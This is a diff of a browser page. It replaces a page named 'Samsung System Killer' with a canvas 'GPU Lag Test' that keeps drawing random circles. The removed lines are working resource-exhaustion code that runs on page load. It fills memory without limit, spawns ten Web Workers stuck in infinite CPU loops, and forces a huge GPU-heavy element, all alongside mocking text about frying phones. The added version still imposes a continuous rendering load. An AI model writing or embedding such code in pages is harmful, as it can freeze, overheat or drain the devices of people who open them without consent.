@@ -1,45 +1,39 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Samsung System Killer</title>
-    <script>
-      window.onload = function () {
-        // Memory Hog
-        let bigMemory = [];
-        setInterval(() => {
-          for (let i = 0; i < 100; i++) {
-            bigMemory.push(new Array(1000000).fill("Samsung is the worst company ever!"));
-          }
-          console.log("Filling RAM like a Tapori legend...");
-        }, 100);
-
-        // CPU Stress (without crashing browser)
-        function superLoad() {
-          let a = 1;
-          while (true) {
-            a *= Math.random() * 99999;
-            if (a > 1e300) a = 1; // reset to prevent NaN
-          }
-        }
-
-        // Run stress in background using Workers
-        for (let i = 0; i < 10; i++) {
-          const blob = new Blob(["(" + superLoad.toString() + ")()"]);
-          const url = URL.createObjectURL(blob);
-          new Worker(url);
-        }
-
-        // Force GPU to render massive elements
-        const spamDiv = document.createElement('div');
-        spamDiv.style.width = "100000px";
-        spamDiv.style.height = "100000px";
-        spamDiv.style.background = "repeating-radial-gradient(circle, red, black 5px)";
-        document.body.appendChild(spamDiv);
-      };
-    </script>
+    <title>GPU Lag Test</title>
+    <style>
+      body {
+        margin: 0;
+        overflow: hidden;
+      }
+      canvas {
+        display: block;
+      }
+    </style>
   </head>
   <body>
-    <h1>Samsung Lag Fest - Full Phone Fry Mode!</h1>
-    <p>Browser is running... phone crying in background!</p>
+    <canvas id="canvas"></canvas>
+    <script>
+      const canvas = document.getElementById("canvas");
+      const ctx = canvas.getContext("2d");
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+
+      function draw() {
+        for (let i = 0; i < 1000; i++) {
+          let x = Math.random() * canvas.width;
+          let y = Math.random() * canvas.height;
+          let r = Math.random() * 100;
+          ctx.beginPath();
+          ctx.arc(x, y, r, 0, Math.PI * 2);
+          ctx.fillStyle = `rgba(${Math.random()*255}, ${Math.random()*255}, ${Math.random()*255}, 0.5)`;
+          ctx.fill();
+        }
+        requestAnimationFrame(draw);
+      }
+
+      draw();
+    </script>
   </body>
 </html>
